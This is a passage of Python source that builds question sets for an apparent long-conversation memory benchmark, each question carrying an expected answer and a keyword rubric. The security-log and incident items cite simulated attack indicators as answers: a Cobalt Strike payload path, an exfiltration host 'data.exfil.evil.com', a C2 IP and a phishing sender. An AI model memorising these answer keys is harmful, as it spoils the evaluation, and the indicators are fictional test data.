            expected_answer="From 3.1 per week to 8.3 per week (about 2.7x improvement)",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("3.1 to 8.3", keywords=["3.1", "8.3"]),
        ),
        Question(
            question_id="numerical_08",
            text="What are the open bug counts broken down by severity?",
            expected_answer="342 total: 123 critical, 219 non-critical",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("342 total: 123 critical, 219", keywords=["342", "123", "219"]),
        ),
        Question(
            question_id="numerical_09",
            text="How much does the database query optimization save monthly and what was the change?",
            expected_answer="$34K/month savings by reducing read replicas from 5 to 3",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$34K/month, 5 to 3 replicas", keywords=["34", "5", "3"]),
        ),
        Question(
            question_id="numerical_10",
            text="What was the Q1 revenue and how did it compare to forecast?",
            expected_answer="$4.7M, 12% above forecast of $4.2M",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$4.7M, 12% above $4.2M", keywords=["4.7", "12%", "4.2"]),
        ),
        Question(
            question_id="numerical_11",
            text="What is the customer retention rate and the target?",
            expected_answer="94.3%, target is 95%",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("94.3%, target 95%", keywords=["94.3", "95"]),
        ),
        Question(
            question_id="numerical_12",
            text="What is the premium subscription conversion rate?",
            expected_answer="7.8% from free trial to paid",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("7.8%", keywords=["7.8"]),
        ),
        Question(
            question_id="numerical_13",
            text="How many security audit findings were there and what severity breakdown?",
            expected_answer="17 issues: 3 critical, 5 high, 9 medium",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("17 issues: 3 critical, 5 high, 9 medium", keywords=["17", "3", "5", "9"]),
        ),
        Question(
            question_id="numerical_14",
            text="What is the monthly AWS bill and the month-over-month change?",
            expected_answer="$127K, up 8% from last month",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$127K, up 8%", keywords=["127", "8%"]),
        ),
        Question(
            question_id="numerical_15",
            text="What is the mean time to recovery and how has it changed?",
            expected_answer="23 minutes, down from 45 minutes",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("23 minutes, down from 45", keywords=["23", "45"]),
        ),
    ]
    numerical_questions = [
        q for q in numerical_questions if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(numerical_questions[:numerical_count])

    # Category 4: Source attribution (10% of questions)
    source_count = max(1, int(10 * scale))
    source_questions = [
        Question(
            question_id="source_01",
            text="What does the internal audit say the server migration cost was, versus the vendor invoice?",
            expected_answer="Internal audit: $450K; Vendor invoice: $387K. The $63K difference was consulting fees billed separately.",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution"],
            rubric=_make_rubric(
                "Internal audit $450K, vendor $387K",
                keywords=["450", "387", "63"],
            ),
        ),
        Question(
            question_id="source_02",
            text="What are the different claims about Q3 revenue and who made each claim?",
            expected_answer="Finance Department: $5.2M (includes deferred revenue); External Auditor: $4.8M (excludes deferred); Board Presentation: $5.0M (rounded, preliminary)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution", "specificity"],
            rubric=_make_rubric(
                "Finance $5.2M, Auditor $4.8M, Board $5.0M",
                keywords=["5.2", "4.8", "5.0"],
            ),
        ),
        Question(
            question_id="source_03",
            text="According to each source, what is the competitor market share?",
            expected_answer="Gartner: 23% (enterprise only); Internal Research: 31% (includes SMB); Industry Newsletter: 18% (revenue-based)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution"],
            rubric=_make_rubric(
                "Gartner 23%, Internal 31%, Newsletter 18%",
                keywords=["23%", "31%", "18%"],
            ),
        ),
        Question(
            question_id="source_04",
            text="What do different sources say about user satisfaction scores?",
            expected_answer="Customer Success Team: 4.5/5 (post-support surveys); Annual Survey: 3.8/5 (random sample); App Store Reviews: 4.2/5",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution"],
            rubric=_make_rubric(
                "4.5/5, 3.8/5, 4.2/5",
                keywords=["4.5", "3.8", "4.2"],
            ),
        ),
        Question(
            question_id="source_05",
            text="How do the engineering headcount figures differ across sources?",
            expected_answer="HR: 187 (full-time only); Engineering VP: 214 (includes 27 contractors); LinkedIn: 203 (may include interns)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution", "specificity"],
            rubric=_make_rubric(
                "HR 187, VP 214, LinkedIn 203",
                keywords=["187", "214", "203"],
            ),
        ),
        Question(
            question_id="source_06",
            text="Which source gives the lowest competitor market share figure?",
            expected_answer="Industry Newsletter at 18% (based on revenue, not customers)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution"],
            rubric=_make_rubric(
                "Industry Newsletter 18%",
                keywords=["18%", "Newsletter"],
                paraphrases=["newsletter", "industry"],
            ),
        ),
        Question(
            question_id="source_07",
            text="What does the DBA team say about database migration risk vs the external consultant?",
            expected_answer="DBA Team: low risk (schema compatible, tested); External Consultant: high risk (similar migrations failed at 3 companies)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution"],
            rubric=_make_rubric(
                "DBA low risk, consultant high risk",
                keywords=["low risk", "high risk"],
                paraphrases=["DBA", "consultant"],
            ),
        ),
        Question(
            question_id="source_08",
            text="What are the three different proposed product launch dates?",
            expected_answer="PM Roadmap: March 15; Engineering Lead: April 2 (testing buffer); Marketing: March 22 (conference)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution", "specificity"],
            rubric=_make_rubric(
                "March 15, April 2, March 22",
                keywords=["March 15", "April 2", "March 22"],
            ),
        ),
        Question(
            question_id="source_09",
            text="What do different sources say about the data center energy usage?",
            expected_answer="Facilities: 2.4 MW (measured at meter); Cloud Provider: 1.8 MW (shared allocation); Sustainability Report: 3.1 MW (includes cooling/networking)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution"],
            rubric=_make_rubric(
                "2.4 MW, 1.8 MW, 3.1 MW",
                keywords=["2.4", "1.8", "3.1"],
            ),
        ),
        Question(
            question_id="source_10",
            text="How do the support ticket volume trend claims differ?",
            expected_answer="Support Dashboard: declining 5% MoM (new docs); CTO: flat (complexity increasing); Customer Advisory Board: increasing (enterprise issues)",
            category="source_attribution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "source_attribution"],
            rubric=_make_rubric(
                "declining, flat, increasing",
                keywords=["declining", "flat", "increasing"],
                paraphrases=["5%", "decreasing"],
            ),
        ),
    ]
    source_questions = [
        q for q in source_questions if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(source_questions[:source_count])

    # Category 5: Cross-reference (10% of questions)
    cross_ref_count = max(1, int(10 * scale))
    cross_ref_questions = [
        Question(
            question_id="crossref_01",
            text="Which project is Sarah Chen currently leading and what award did she receive?",
            expected_answer="Sarah Chen led Project Atlas to completion and received the Innovation Award. Lars Eriksson now leads the maintenance phase.",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric(
                "Sarah Chen, Atlas, Innovation Award, Lars Eriksson",
                keywords=["Sarah Chen", "Atlas", "Innovation Award"],
            ),
        ),
        Question(
            question_id="crossref_02",
            text="Fatima Al-Hassan moved from one project to research. Who replaced her and on which project?",
            expected_answer="Fatima Al-Hassan was leading Project Echo. Yuki Tanaka replaced her when Fatima moved to the research division.",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "Fatima Al-Hassan, Echo, Yuki Tanaka",
                keywords=["Echo", "Yuki Tanaka"],
            ),
        ),
        Question(
            question_id="crossref_03",
            text="What is Marcus Rivera's current role and how did his departure affect Project Beacon?",
            expected_answer="Marcus Rivera moved from Product Manager to strategic planning. Amara Okafor took over as lead of Project Beacon.",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "Marcus Rivera strategic planning, Amara Okafor Beacon",
                keywords=["Amara Okafor", "Beacon"],
                paraphrases=["strategic planning"],
            ),
        ),
        Question(
            question_id="crossref_04",
            text="Which person on the Platform team has a pet husky, and what project maintenance do they now lead?",
            expected_answer="Lars Eriksson is on the Platform team, has a husky named Thor, and now leads the Atlas maintenance phase.",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric(
                "Lars Eriksson, Thor, Atlas",
                keywords=["Lars Eriksson", "Thor", "Atlas"],
            ),
        ),
        Question(
            question_id="crossref_05",
            text="Which projects went over their original budget and by how much?",
            expected_answer="Atlas: $2.1M -> $2.5M (+$400K), final cost $2.7M; Beacon: $800K -> $950K (+$150K); Delta: $1.2M -> $1.4M (+$200K); Echo: $1.8M -> $2.2M (+$400K)",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric(
                "Atlas, Beacon, Delta, Echo over budget",
                keywords=["Atlas", "Beacon", "Delta", "Echo"],
            ),
        ),
        Question(
            question_id="crossref_06",
            text="Which person from Mumbai works in DevOps and what is their hobby?",
            expected_answer="Priya Patel from Mumbai is the DevOps Lead on the Infrastructure team. Her hobby is marathon running.",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "Priya Patel, marathon",
                keywords=["Priya Patel", "marathon"],
            ),
        ),
        Question(
            question_id="crossref_07",
            text="Which engineer holds a PhD and is now leading a project that was previously led by someone else?",
            expected_answer="Yuki Tanaka has a PhD Statistics from MIT and now leads Project Echo (previously led by Fatima Al-Hassan).",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "Yuki Tanaka, PhD, Echo",
                keywords=["Yuki Tanaka", "PhD", "Echo"],
            ),
        ),
        Question(
            question_id="crossref_08",
            text="Considering the total server migration costs (audit + consulting), how much did the vendor charge less than the total?",
            expected_answer="Total: $450K + $63K = $513K; Vendor: $387K; Difference: $126K (vendor charged $126K less than total)",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$126K difference", keywords=["126", "387", "513"]),
        ),
        Question(
            question_id="crossref_09",
            text="Who on the AI/ML team has a Persian cat, and what happened to the project they led?",
            expected_answer="Fatima Al-Hassan on the AI/ML team has a Persian cat named Layla. She led Project Echo but moved to research; Yuki Tanaka replaced her.",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric(
                "Fatima Al-Hassan, Layla, Echo",
                keywords=["Fatima", "Layla", "Echo"],
            ),
        ),
        Question(
            question_id="crossref_10",
            text="Which project came in ahead of schedule, and what happened to its team size?",
            expected_answer="Project Cascade moved deadline from May 1 to April 15 (ahead of schedule). Team size decreased from 4 to 3 (one member moved to Atlas).",
            category="cross_reference",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "Cascade, ahead of schedule, 4 to 3",
                keywords=["Cascade", "April 15"],
            ),
        ),
    ]
    cross_ref_questions = [
        q for q in cross_ref_questions if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(cross_ref_questions[:cross_ref_count])

    # Category 6: Distractor resistance (10% of questions)
    distractor_count = max(1, int(10 * scale))
    distractor_questions = [
        Question(
            question_id="distractor_01",
            text="What is Priya Patel's allergy? Answer with ONLY the allergy information, ignoring any unrelated facts.",
            expected_answer="Priya Patel has no known allergies (none).",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "confidence_calibration"],
            rubric=_make_rubric("none", keywords=["none"], paraphrases=["no known", "no allergies"]),
        ),
        Question(
            question_id="distractor_02",
            text="What is the sprint velocity? Do not include any random trivia in your answer.",
            expected_answer="47 points (team average over last 6 sprints)",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("47 points", keywords=["47"]),
        ),
        Question(
            question_id="distractor_03",
            text="What is Elena Volkov's pet situation? Focus only on the people data.",
            expected_answer="Elena Volkov doesn't have any pets.",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("no pets", keywords=["no"], paraphrases=["none", "doesn't have"]),
        ),
        Question(
            question_id="distractor_04",
            text="What is the median code review turnaround time? Answer precisely.",
            expected_answer="4.2 hours (median time to first review)",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("4.2 hours", keywords=["4.2"]),
        ),
        Question(
            question_id="distractor_05",
            text="What language introduced virtual threads for lightweight concurrency?",
            expected_answer="Java 21",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Java 21", keywords=["Java", "21"]),
        ),
        Question(
            question_id="distractor_06",
            text="What is the feature request backlog size and how many are from enterprise?",
            expected_answer="892 items total, 387 from enterprise customers",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("892 total, 387 enterprise", keywords=["892", "387"]),
        ),
        Question(
            question_id="distractor_07",
            text="What is the average session duration broken down by platform?",
            expected_answer="14.3 minutes overall. Mobile: 8.2 minutes, Desktop: 22.1 minutes.",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("14.3, 8.2, 22.1", keywords=["14.3", "8.2", "22.1"]),
        ),
        Question(
            question_id="distractor_08",
            text="How many critical security audit findings were there?",
            expected_answer="3 critical (out of 17 total: 3 critical, 5 high, 9 medium)",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("3 critical", keywords=["3"]),
        ),
        Question(
            question_id="distractor_09",
            text="What was the CI/CD pipeline speed improvement?",
            expected_answer="40% improvement, from 12 minutes to 7.2 minutes average",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("40%, 12 to 7.2 minutes", keywords=["40%", "12", "7.2"]),
        ),
        Question(
            question_id="distractor_10",
            text="What is the Q4 projected revenue and the assumed growth rate?",
            expected_answer="$6.1M projected, based on 18% growth rate",
            category="distractor_resistance",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$6.1M, 18%", keywords=["6.1", "18%"]),
        ),
    ]
    distractor_questions = [
        q
        for q in distractor_questions
        if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(distractor_questions[:distractor_count])

    # Category 7: Meta-memory (5% of questions)
    meta_count = max(1, int(5 * scale))
    meta_questions = [
        Question(
            question_id="meta_01",
            text="How many different projects have I told you about?",
            expected_answer="5 projects: Atlas, Beacon, Cascade, Delta, and Echo",
            category="meta_memory",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric(
                "5 projects",
                keywords=["5", "Atlas", "Beacon", "Cascade", "Delta", "Echo"],
            ),
        ),
        Question(
            question_id="meta_02",
            text="How many different people's personal details did I share with you?",
            expected_answer="10 people: Sarah Chen, Marcus Rivera, Yuki Tanaka, Priya Patel, James O'Brien, Amara Okafor, Lars Eriksson, Elena Volkov, Diego Morales, Fatima Al-Hassan",
            category="meta_memory",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("10 people", keywords=["10"]),
        ),
        Question(
            question_id="meta_03",
            text="Which topics had conflicting information from different sources?",
            expected_answer="Q3 revenue, competitor market share, user satisfaction, engineering headcount, data center energy, product launch date, support ticket trends, database migration risk",
            category="meta_memory",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric(
                "conflicting topics",
                keywords=["revenue", "market share"],
            ),
        ),
        Question(
            question_id="meta_04",
            text="Which project had the most updates and changes during our conversation?",
            expected_answer="Project Atlas had the most changes: deadline changed twice, budget changed, team size changed, security issues, performance optimization, rollout stages, leadership change",
            category="meta_memory",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Atlas", keywords=["Atlas"]),
        ),
        Question(
            question_id="meta_05",
            text="How many technical domains did I cover in the technical facts section?",
            expected_answer="8 domains: programming, security, databases, cloud, ml_ai, devops, architecture, frontend",
            category="meta_memory",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("8 domains", keywords=["8"]),
        ),
    ]
    meta_questions = [
        q for q in meta_questions if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(meta_questions[:meta_count])

    # Category 8: Security log analysis (conditional on security blocks being delivered)
    has_security = "__block:security_logs__" in delivered
    if has_security:
        sec_log_count = max(1, int(8 * scale))
        sec_log_questions = [
            Question(
                question_id="seclog_01",
                text="How many failed SSH logins came from IP 192.168.1.45?",
                expected_answer="6 failed SSH logins (3 as admin, 3 as root) before a successful login as admin",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="seclog_02",
                text="What was the brute force attack pattern from 192.168.1.45?",
                expected_answer="6 failed SSH logins alternating between admin and root users within seconds (14:23:01 to 14:23:18), followed by a successful login as admin at 14:23:22, then a privilege escalation attempt at 14:30:00",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            ),
            Question(
                question_id="seclog_03",
                text="What ports were scanned by 10.0.0.50?",
                expected_answer="Ports 22, 80, 443, 3306, 5432, 8080, 8443",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="seclog_04",
                text="What malware was detected on 10.0.0.5 and what lateral movement technique was used?",
                expected_answer="Cobalt Strike beacon was detected in /tmp/.hidden/payload.exe. Lateral movement via PsExec targeting 10.0.0.6 and 10.0.0.7",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="seclog_05",
                text="How many critical severity events were logged?",
                expected_answer="Multiple critical events including: successful SSH login after brute force, privilege escalation, SQL injection, C2 connection, RDP brute force, Cobalt Strike, database dump, ransomware, supply chain compromise, golden ticket, CloudTrail disabled, container escape, AWS key exposure, zero-day exploit, SSRF, SIEM correlation alert",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="seclog_06",
                text="What data exfiltration indicators were detected?",
                expected_answer="2.3GB data transfer from 172.16.0.100 to external IP 185.220.101.45, anomalous DNS query to data.exfil.evil.com, connection to known C2 server at 185.220.101.45",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="seclog_07",
                text="What supply chain attack was detected and what CVE was involved?",
                expected_answer="Malicious dependency in event-stream@5.0.0 package, and CVE-2024-3094 (xz-utils/sshd backdoor)",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy"],
            ),
            Question(
                question_id="seclog_08",
                text="What phishing attempt was detected and who was targeted?",
                expected_answer="Phishing email to hr_inbox with subject 'Urgent: Update your credentials' from support@1egit-company.com (note the '1' instead of 'l')",
                category="security_log_analysis",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
        ]
        sec_log_questions = [
            q for q in sec_log_questions if _question_references_delivered(q, delivered, ground_truth)
        ]
        questions.extend(sec_log_questions[:sec_log_count])

    # Category 9: Incident tracking (conditional on incidents block)
    has_incidents = "__block:incidents__" in delivered
    if has_incidents:
        incident_count = max(1, int(6 * scale))
        incident_questions = [
            Question(
                question_id="incident_01",
                text="What is the current status of INC-2024-001?",
                expected_answer="Closed. The ransomware attempt was contained, files restored from backup, attacker C2 blocked, and post-incident review completed with MFA enforced for all admin accounts.",
                category="incident_tracking",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            ),
            Question(
                question_id="incident_02",
                text="Which incident involved data exfiltration and how many customers were affected?",
                expected_answer="INC-2024-002: Data exfiltration via compromised svc_backup service account. 2.3GB exfiltrated, breach notification sent to 15,000 affected customers.",
                category="incident_tracking",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="incident_03",
                text="What APT group was attributed to the development infrastructure attack?",
                expected_answer="INC-2024-003: TTPs matched APT29 (likely state-sponsored). The attack involved supply chain compromise (event-stream), crypto mining on CI server, DNS tunneling, and xz-utils backdoor (CVE-2024-3094).",
                category="incident_tracking",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="incident_04",
                text="How was the AWS key exposure in INC-2024-004 resolved?",
                expected_answer="Key immediately revoked, CloudTrail audit showed key was used 3 times before revocation but no customer data was accessed (only listed buckets). Git-secrets hook deployed to all repos with mandatory pre-commit scanning.",
                category="incident_tracking",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            ),
            Question(
                question_id="incident_05",
                text="Which incidents have CVEs associated with them?",
                expected_answer="INC-2024-001 has CVE-2024-21626, and INC-2024-003 has CVE-2024-3094 (xz-utils backdoor)",
                category="incident_tracking",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="incident_06",
                text="What was the timeline of the insider threat incident?",
                expected_answer="INC-2024-006: DLP alert at 14:00 for bulk download of 500+ sensitive documents, account suspended at 14:30, HR/Legal notified and device confiscated at 15:00. User had resigned 2 weeks prior and was downloading competitor-sensitive data. Legal action initiated.",
                category="incident_tracking",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            ),
        ]
        incident_questions = [
            q for q in incident_questions if _question_references_delivered(q, delivered, ground_truth)
        ]
        questions.extend(incident_questions[:incident_count])

    # Category 10: Infrastructure knowledge (conditional on infrastructure block)
    has_infra = "__block:infrastructure__" in delivered
    if has_infra:
        infra_count = max(1, int(6 * scale))
        infra_questions = [
            Question(
                question_id="infra_01",
                text="Which subnet hosts the production Kubernetes cluster?",
                expected_answer="The k8s-prod cluster (v1.29, 12 nodes) runs in the prod-app subnet (10.0.2.0/24)",
                category="infrastructure_knowledge",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="infra_02",
                text="What firewall rule prevents development from accessing production?",
                expected_answer="Rule 'deny-dev-to-prod' blocks all ports from 10.0.6.0/24 (dev) to 10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24 (prod subnets)",
                category="infrastructure_knowledge",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="infra_03",
                text="What database engine is used for the primary database and how large is it?",
                expected_answer="PostgreSQL 16 on pg-primary at 10.0.3.10:5432, 450GB with 2 replicas",
                category="infrastructure_knowledge",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="infra_04",
                text="What DNS record points to the database primary?",
                expected_answer="db-primary.internal (A record) points to 10.0.3.10 with 60s TTL",
                category="infrastructure_knowledge",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="infra_05",
                text="How many Kubernetes pods are running across all clusters?",
                expected_answer="226 total pods: k8s-prod has 156, k8s-staging has 42, k8s-dev has 28",
                category="infrastructure_knowledge",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="infra_06",
                text="What is the purpose of the DMZ subnet and what is its CIDR?",
                expected_answer="The DMZ subnet (10.0.4.0/24) in us-east-1a is for public-facing services",
                category="infrastructure_knowledge",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy"],
            ),
        ]
        infra_questions = [
            q for q in infra_questions if _question_references_delivered(q, delivered, ground_truth)
        ]
        questions.extend(infra_questions[:infra_count])

    # Category 11: Problem solving (conditional on problem_solving block)
    has_problems = "__block:problem_solving__" in delivered
    if has_problems:
        problem_count = max(1, int(4 * scale))
        problem_questions = [
            Question(
                question_id="problem_01",
                text="What approach should be used to extract IPs with more than 5 failed logins from the auth log?",
                expected_answer="Use an awk/grep pipeline with sort | uniq -c | sort -rn, filtering for 'Failed' keyword. Auth log is at /var/log/auth.log with format: timestamp user source_ip action.",
                category="problem_solving",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="problem_02",
                text="What Terraform resources are needed for the DMZ subnet with WAF?",
                expected_answer="azurerm_subnet + azurerm_web_application_firewall_policy with OWASP 3.2 ruleset. DMZ CIDR is 10.0.4.0/24 on Azure.",
                category="problem_solving",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="problem_03",
                text="What SIEM rule format and parameters should be used to detect the APT kill chain?",
                expected_answer="Sigma rule format correlating port_scan + exploit + psexec + large_transfer events within a 24-hour time window, minimum confidence threshold 0.8",
                category="problem_solving",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
            Question(
                question_id="problem_04",
                text="What approach should be used to detect DNS tunneling with Suricata?",
                expected_answer="Suricata rule using dns.query with PCRE for high-entropy base64-like subdomains, entropy threshold > 3.5 bits/char, on Suricata IDS version 7",
                category="problem_solving",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
            ),
        ]
        problem_questions = [
            q for q in problem_questions if _question_references_delivered(q, delivered, ground_truth)
        ]
        questions.extend(problem_questions[:problem_count])

    # Category 12: Multi-hop reasoning (chains across blocks)
    multi_hop_count = max(1, int(6 * scale))
    multi_hop_questions: list[Question] = []

    # 2-hop questions (always available - chain across original blocks)
    multi_hop_questions.extend([
        Question(
            question_id="multihop_01",
            text="Which person from the Security team has a pet, and what project changes happened related to security?",
            expected_answer="James O'Brien is on the Security team and has a border collie named Scout. Project Atlas had 5 critical security vulnerabilities found, then 3 patched, then all resolved. Atlas also hired 3 contractors for a security audit.",
            category="multi_hop_reasoning",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            chain_length=2,
        ),
        Question(
            question_id="multihop_02",
            text="The person who leads the AI/ML team's project was transferred to someone with a PhD. What is that PhD in and from where?",
            expected_answer="Fatima Al-Hassan led Project Echo (AI-powered customer support chatbot) and moved to research. Yuki Tanaka replaced her; Yuki has a PhD in Statistics from MIT.",
            category="multi_hop_reasoning",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            chain_length=2,
        ),
        Question(
            question_id="multihop_03",
            text="Which project's budget increase was closest in dollar amount to the monthly AWS bill?",
            expected_answer="Project Beacon increased by $150K ($800K to $950K), and the monthly AWS bill is $127K. Delta increased by $200K. So Beacon's increase ($150K) is closest to the $127K AWS bill.",
            category="multi_hop_reasoning",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            chain_length=2,
        ),
    ])

    # 3-hop questions (conditional on security blocks for richer chains)
    if has_security and has_incidents:
        multi_hop_questions.extend([
            Question(
                question_id="multihop_04",
                text="Which CVE affects the system targeted by the attacker using the IP that performed the brute force SSH attack, and what incident is it part of?",
                expected_answer="The brute force SSH attack came from 192.168.1.45. After successful login, privilege escalation was attempted. The broader APT campaign (INC-2024-003) included CVE-2024-3094 (xz-utils/sshd backdoor) and CVE-2024-21626 was associated with INC-2024-001 (ransomware).",
                category="multi_hop_reasoning",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
                chain_length=3,
            ),
            Question(
                question_id="multihop_05",
                text="The C2 server IP appears in both the security logs and an incident report. Which incident, what was the status progression, and what data was exfiltrated?",
                expected_answer="IP 185.220.101.45 appears as a C2 server connection in security logs from 172.16.0.100 (svc_backup). This is INC-2024-002 (data exfiltration). Status: active -> investigating -> contained -> remediated. 2.3GB was exfiltrated, and breach notification was sent to 15,000 customers.",
                category="multi_hop_reasoning",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
                chain_length=3,
            ),
        ])

    if has_security and has_infra:
        multi_hop_questions.extend([
            Question(
                question_id="multihop_06",
                text="The firewall was changed to allow RDP from the internet. Which subnet was affected, and what infrastructure sits behind that subnet's load balancer?",
                expected_answer="The firewall rule change opened port 3389 (RDP) from 0.0.0.0/0. The management subnet (10.0.5.0/24) handles monitoring. The production subnets are protected by ALB (alb-prod-web targeting prod-web) and NLB (nlb-prod-api targeting prod-app for port 8443).",
                category="multi_hop_reasoning",
                relevant_turns=[],
                scoring_dimensions=["factual_accuracy", "specificity"],
                chain_length=3,
            ),
        ])

    multi_hop_questions = [
        q for q in multi_hop_questions if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(multi_hop_questions[:multi_hop_count])

    # Add bonus questions to fill up to num_questions if needed
    bonus_questions = [
        Question(
